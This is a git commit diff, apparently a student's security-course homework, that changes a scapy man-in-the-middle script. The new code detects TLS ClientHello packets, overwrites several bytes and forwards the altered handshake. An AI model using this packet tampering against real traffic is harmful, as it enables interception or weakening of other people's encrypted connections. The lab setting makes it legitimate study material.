34f3bc71bad557e1357e11c4f295f5965e5c0bfe
dosarudaniel <dosarudaniel@gmail.com>
2019-10-30 15:36:05 +0200

    Solved HW4 task 2

--- HW4/Ex02/mitm.py
+++ HW4/Ex02/mitm.py
@@ -3,15 +3,18 @@ from scapy.all import *
 
 def print_and_accept(pkt):
     print("Received " + str(pkt))
-    # print(pkt)
     ip = IP(pkt.get_payload())
+    if (ip.haslayer("Raw")):
+        old_payload = ip["Raw"].load
+        # print(old_payload)
+        if (old_payload[0] == 0x16 and old_payload[5] == 0x01):
+            print(46,47,old_payload[46], old_payload[47])
+            new_payload = [b for b in old_payload]
 
-    if (ip.haslayer(Raw)):
-        http = ip[Raw].load.decode()
-        # if not(http.find('X-Cache')):
-        print("---------------------------------------------------------")
-        print(http)
-        print("##########################################################")
+            new_payload[46] = 0x00
+            new_payload[4] = 0x2f
+            pkt.set_payload(bytes(new_payload))
+
 
     pkt.accept()
 
